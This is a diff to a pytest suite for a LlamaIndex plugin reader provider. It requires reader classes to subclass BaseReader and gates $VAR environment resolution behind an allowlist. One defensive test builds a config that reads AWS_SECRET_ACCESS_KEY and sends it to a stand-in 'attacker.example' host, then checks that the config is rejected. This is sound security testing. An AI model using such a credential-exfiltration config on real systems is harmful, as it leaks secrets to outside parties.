@@ -27,6 +27,7 @@ from unittest.mock import Mock, MagicMock, patch, PropertyMock
 from dataclasses import dataclass
 
 from llama_index.core.schema import Document
+from llama_index.core.readers.base import BaseReader
 
 
 # ---------------------------------------------------------------------------
@@ -52,19 +53,46 @@ def _make_config(**overrides):
     return LlamaIndexPluginReaderConfig(**defaults)
 
 
-def _mock_reader_module(reader_class_name="ConfluenceReader", load_return=None):
-    """Create a mock module with a mock reader class."""
+def _mock_reader_module(reader_class_name="ConfluenceReader", load_return=None,
+                        init_side_effect=None):
+    """Create a mock module whose reader_class is a real BaseReader subclass.
+
+    The provider now requires reader_class to be a BaseReader subclass, so a
+    bare Mock no longer passes the gate. The returned `reader` holder proxies the
+    instance the provider builds: its load_data/lazy_load/aload_data are shared
+    Mocks a test can configure or assert on, and `ctor` records constructor args.
+    """
     mock_module = MagicMock()
-    mock_reader_instance = Mock()
-    mock_reader_instance.load_data = Mock(
-        return_value=load_return if load_return is not None else [
-            Document(text="Page 1 content", metadata={"title": "Page 1"}),
-            Document(text="Page 2 content", metadata={"title": "Page 2"}),
-        ]
-    )
-    mock_reader_class = Mock(return_value=mock_reader_instance)
-    setattr(mock_module, reader_class_name, mock_reader_class)
-    return mock_module, mock_reader_class, mock_reader_instance
+    docs = load_return if load_return is not None else [
+        Document(text="Page 1 content", metadata={"title": "Page 1"}),
+        Document(text="Page 2 content", metadata={"title": "Page 2"}),
+    ]
+
+    reader = Mock()
+    reader.load_data = Mock(return_value=docs)
+    ctor = Mock()
+
+    # Define the load methods on the CLASS (like a real BaseReader subclass) so
+    # the import-time presence gate can see them; each delegates to the shared
+    # `reader` mock the test configures/asserts on.
+    class MockReader(BaseReader):
+        def __init__(self, **kwargs):
+            ctor(**kwargs)
+            if init_side_effect is not None:
+                raise init_side_effect
+
+        def load_data(self, *args, **kwargs):
+            return reader.load_data(*args, **kwargs)
+
+        def lazy_load(self, *args, **kwargs):
+            return reader.lazy_load(*args, **kwargs)
+
+        def aload_data(self, *args, **kwargs):
+            return reader.aload_data(*args, **kwargs)
+
+    MockReader.__name__ = reader_class_name
+    setattr(mock_module, reader_class_name, MockReader)
+    return mock_module, ctor, reader
 
 
 # ---------------------------------------------------------------------------
@@ -201,9 +229,9 @@ class TestImportErrors:
 
     def test_raises_on_invalid_init_args(self):
         """ValueError when constructor args don't match reader signature."""
-        mock_module = MagicMock()
-        mock_cls = Mock(side_effect=TypeError("__init__() got unexpected keyword argument 'bogus'"))
-        mock_module.ConfluenceReader = mock_cls
+        mock_module, _, _ = _mock_reader_module(
+            init_side_effect=TypeError("__init__() got unexpected keyword argument 'bogus'")
+        )
         config = _make_config(init_args={"bogus": "value"})
 
         with patch("importlib.import_module", return_value=mock_module):
@@ -280,9 +308,9 @@ class TestAuthFailures:
 
     def test_auth_error_during_init(self):
         """Auth error during reader construction is detected."""
-        mock_module = MagicMock()
-        mock_cls = Mock(side_effect=RuntimeError("401 Unauthorized: invalid API key"))
-        mock_module.ConfluenceReader = mock_cls
+        mock_module, _, _ = _mock_reader_module(
+            init_side_effect=RuntimeError("401 Unauthorized: invalid API key")
+        )
         config = _make_config()
 
         with patch("importlib.import_module", return_value=mock_module):
@@ -638,26 +666,73 @@ class TestNamespaceAllowlist:
 
 
 class TestInterfaceValidation:
-    """Item #2: Verify interface check before instantiation."""
+    """Item #2: reader_class must resolve to a BaseReader subclass, not any
+    callable in an allowed module."""
 
-    def test_non_callable_rejected(self):
-        """Non-callable attribute is rejected before constructor runs."""
+    def test_non_class_rejected(self):
+        """A non-class attribute (e.g. a string) is rejected before instantiation."""
         mock_module = Mock()
         mock_module.NotAClass = "just a string"
         config = _make_config(module_path="llama_index.readers.test", reader_class="NotAClass")
         with patch("importlib.import_module", return_value=mock_module):
-            with pytest.raises(ReaderImportError, match="is not callable"):
+            with pytest.raises(ReaderImportError, match="BaseReader"):
                 LlamaIndexPluginReaderProvider(config)
 
-    def test_missing_load_data_rejected(self):
-        """Class without load_data or lazy_load is rejected before instantiation."""
+    def test_non_basereader_class_rejected(self):
+        """A callable/class that isn't a BaseReader subclass is rejected, even
+        if it happens to have a load_data method."""
+        class NotAReader:
+            def load_data(self):
+                return []
+
         mock_module = Mock()
-        mock_cls = Mock()
-        mock_cls.load_data = None
-        del mock_cls.load_data
-        del mock_cls.lazy_load
-        mock_module.BadReader = mock_cls
+        mock_module.BadReader = NotAReader
         config = _make_config(module_path="llama_index.readers.test", reader_class="BadReader")
+        with patch("importlib.import_module", return_value=mock_module):
+            with pytest.raises(ReaderImportError, match="BaseReader"):
+                LlamaIndexPluginReaderProvider(config)
+
+    def test_duck_typed_class_with_load_and_lazy_still_rejected(self):
+        """A class implementing both load_data and lazy_load is still rejected
+        if it doesn't inherit BaseReader - documents that the old duck-type
+        check is fully removed, not just tightened."""
+        class DuckReader:
+            def load_data(self):
+                return []
+
+            def lazy_load(self):
+                return iter(())
+
+        mock_module = Mock()
+        mock_module.DuckReader = DuckReader
+        config = _make_config(module_path="llama_index.readers.test", reader_class="DuckReader")
+        with patch("importlib.import_module", return_value=mock_module):
+            with pytest.raises(ReaderImportError, match="BaseReader"):
+                LlamaIndexPluginReaderProvider(config)
+
+    def test_basereader_subclass_accepted(self):
+        """A genuine BaseReader subclass passes the gate."""
+        mock_module, _, _ = _mock_reader_module()
+        config = _make_config()
+        with patch("importlib.import_module", return_value=mock_module):
+            provider = LlamaIndexPluginReaderProvider(config)
+            assert provider._reader is not None
+
+    def test_reader_missing_configured_load_method_rejected_at_import(self):
+        """Both gates are kept: a BaseReader subclass that doesn't implement the
+        configured load method fails loud at import (not [] at read time under
+        fail_on_error=False). BaseReader has no lazy_load, so a reader without it
+        configured for lazy_load trips the presence gate."""
+        class NoLazyReader(BaseReader):
+            def load_data(self):
+                return []
+
+        mock_module = Mock()
+        mock_module.NoLazyReader = NoLazyReader
+        config = _make_config(
+            module_path="llama_index.readers.test", reader_class="NoLazyReader",
+            load_method="lazy_load", fail_on_error=False,
+        )
         with patch("importlib.import_module", return_value=mock_module):
             with pytest.raises(ReaderImportError, match="does not implement"):
                 LlamaIndexPluginReaderProvider(config)
@@ -685,42 +760,139 @@ class TestLoadMethodRestriction:
                 provider.read()
 
 
-class TestEnvVarResolution:
-    """Item #4: $VAR_NAME references resolved from environment."""
+class _PermissiveProvider(LlamaIndexPluginReaderProvider):
+    """Opts into resolving the specific env vars these tests reference."""
+    ALLOWED_ENV_VARS = ("MY_TOKEN", "NONEXISTENT_VAR_XYZ")
 
-    def test_resolves_env_var(self, monkeypatch):
-        """$VAR_NAME is replaced with environment value."""
+
+class TestConfigAllowedEnvVars:
+    """The allowlist can be set per-config (no subclassing needed, which the
+    factory can't do), and still blocks anything not listed."""
+
+    def test_config_allowed_env_vars_permits_resolution(self, monkeypatch):
         monkeypatch.setenv("MY_TOKEN", "secret123")
-        mock_module, mock_cls, _ = _mock_reader_module()
-        config = _make_config(init_args={"token": "$MY_TOKEN", "url": "https://example.com"})
+        mock_module, ctor, _ = _mock_reader_module()
+        config = _make_config(init_args={"token": "$MY_TOKEN"},
+                              allowed_env_vars=["MY_TOKEN"])
         with patch("importlib.import_module", return_value=mock_module):
             LlamaIndexPluginReaderProvider(config)
+        ctor.assert_called_once_with(token="secret123")
+
+    def test_config_allowed_env_vars_still_blocks_others(self, monkeypatch):
+        monkeypatch.setenv("AWS_SECRET_ACCESS_KEY", "AKIAsecret")
+        mock_module, _, _ = _mock_reader_module()
+        config = _make_config(init_args={"token": "$AWS_SECRET_ACCESS_KEY"},
+                              allowed_env_vars=["MY_TOKEN"])
+        with patch("importlib.import_module", return_value=mock_module):
+            with pytest.raises(ValueError, match="not in the permitted set"):
+                LlamaIndexPluginReaderProvider(config)
+
+    def test_default_empty_allowlist_blocks_when_unset(self, monkeypatch):
+        # No allowed_env_vars on the config and no subclass -> nothing resolves.
+        monkeypatch.setenv("MY_TOKEN", "secret123")
+        mock_module, _, _ = _mock_reader_module()
+        config = _make_config(init_args={"token": "$MY_TOKEN"})
+        with patch("importlib.import_module", return_value=mock_module):
+            with pytest.raises(ValueError, match="not in the permitted set"):
+                LlamaIndexPluginReaderProvider(config)
+
+
+class TestEnvVarResolution:
+    """Item #4: $VAR_NAME references resolved from environment, but only for
+    names in ALLOWED_ENV_VARS."""
+
+    def test_resolves_permitted_env_var(self, monkeypatch):
+        """A permitted $VAR_NAME is replaced with its environment value."""
+        monkeypatch.setenv("MY_TOKEN", "secret123")
+        mock_module, ctor, _ = _mock_reader_module()
+        config = _make_config(init_args={"token": "$MY_TOKEN", "url": "https://example.com"})
+        with patch("importlib.import_module", return_value=mock_module):
+            _PermissiveProvider(config)
         # Verify the constructor received the resolved value
-        mock_cls.assert_called_once_with(token="secret123", url="https://example.com")
+        ctor.assert_called_once_with(token="secret123", url="https://example.com")
+
+    def test_disallowed_env_var_rejected_even_when_set(self, monkeypatch):
+        """A config cannot pull a process credential that isn't allowlisted,
+        even when it is present in the environment - this is the exfiltration
+        path the allowlist closes."""
+        monkeypatch.setenv("AWS_SECRET_ACCESS_KEY", "AKIAsecret")
+        mock_module, _, _ = _mock_reader_module()
+        config = _make_config(init_args={
+            "token": "$AWS_SECRET_ACCESS_KEY",
+            "base_url": "http://attacker.example",
+        })
+        with patch("importlib.import_module", return_value=mock_module):
+            with pytest.raises(ValueError, match="not in the permitted set") as excinfo:
+                LlamaIndexPluginReaderProvider(config)
+        # The secret value must never be echoed in the exception message.
+        assert "AKIAsecret" not in str(excinfo.value)
 
     def test_missing_env_var_raises(self):
-        """Reference to unset env var raises ValueError."""
+        """A permitted-but-unset env var raises ValueError."""
         config = _make_config(init_args={"token": "$NONEXISTENT_VAR_XYZ"})
         mock_module, _, _ = _mock_reader_module()
         with patch("importlib.import_module", return_value=mock_module):
             with pytest.raises(ValueError, match="not set in the environment"):
-                LlamaIndexPluginReaderProvider(config)
+                _PermissiveProvider(config)
 
     def test_non_env_string_unchanged(self):
         """Strings without $ prefix are passed through unchanged."""
-        mock_module, mock_cls, _ = _mock_reader_module()
+        mock_module, ctor, _ = _mock_reader_module()
         config = _make_config(init_args={"url": "https://example.com", "count": "5"})
         with patch("importlib.import_module", return_value=mock_module):
             LlamaIndexPluginReaderProvider(config)
-        mock_cls.assert_called_once_with(url="https://example.com", count="5")
+        ctor.assert_called_once_with(url="https://example.com", count="5")
 
     def test_lowercase_dollar_not_resolved(self):
         """$lowercase is not treated as env var (only $UPPER_CASE)."""
-        mock_module, mock_cls, _ = _mock_reader_module()
+        mock_module, ctor, _ = _mock_reader_module()
         config = _make_config(init_args={"note": "$not_an_env_var"})
         with patch("importlib.import_module", return_value=mock_module):
             LlamaIndexPluginReaderProvider(config)
-        mock_cls.assert_called_once_with(note="$not_an_env_var")
+        ctor.assert_called_once_with(note="$not_an_env_var")
+
+    # Bypass-boundary tests: forms the regex must NOT treat as an env-var ref.
+    # Under the base provider a false match would raise "not in the permitted
+    # set" instead of reaching the constructor verbatim.
+
+    def test_braced_syntax_not_resolved(self, monkeypatch):
+        """${VAR} brace syntax is passed through literally, not resolved."""
+        monkeypatch.setenv("MY_TOKEN", "secret123")
+        mock_module, ctor, _ = _mock_reader_module()
+        config = _make_config(init_args={"token": "${MY_TOKEN}"})
+        with patch("importlib.import_module", return_value=mock_module):
+            LlamaIndexPluginReaderProvider(config)
+        ctor.assert_called_once_with(token="${MY_TOKEN}")
+
+    def test_nested_dict_not_resolved(self, monkeypatch):
+        """Only top-level string values are resolved; a $VAR nested in a dict
+        is left literal (and so never trips the allowlist)."""
+        monkeypatch.setenv("SECRET", "leaked")
+        mock_module, ctor, _ = _mock_reader_module()
+        config = _make_config(init_args={"auth": {"token": "$SECRET"}})
+        with patch("importlib.import_module", return_value=mock_module):
+            LlamaIndexPluginReaderProvider(config)
+        ctor.assert_called_once_with(auth={"token": "$SECRET"})
+
+    def test_mid_string_not_resolved(self, monkeypatch):
+        """A $VAR embedded mid-string is not an exact match, so it's literal."""
+        monkeypatch.setenv("SECRET", "leaked")
+        mock_module, ctor, _ = _mock_reader_module()
+        config = _make_config(init_args={"url": "https://host/?k=$SECRET"})
+        with patch("importlib.import_module", return_value=mock_module):
+            LlamaIndexPluginReaderProvider(config)
+        ctor.assert_called_once_with(url="https://host/?k=$SECRET")
+
+    def test_load_args_env_var_also_gated(self, monkeypatch):
+        """load_args goes through the same allowlist as init_args, so a
+        disallowed $VAR there is rejected too (at read time)."""
+        monkeypatch.setenv("AWS_SECRET_ACCESS_KEY", "AKIAsecret")
+        mock_module, _, _ = _mock_reader_module()
+        config = _make_config(load_args={"query": "$AWS_SECRET_ACCESS_KEY"})
+        with patch("importlib.import_module", return_value=mock_module):
+            provider = LlamaIndexPluginReaderProvider(config)
+            with pytest.raises(ValueError, match="not in the permitted set"):
+                provider.read()
 
 
 class TestCredentialLogging:
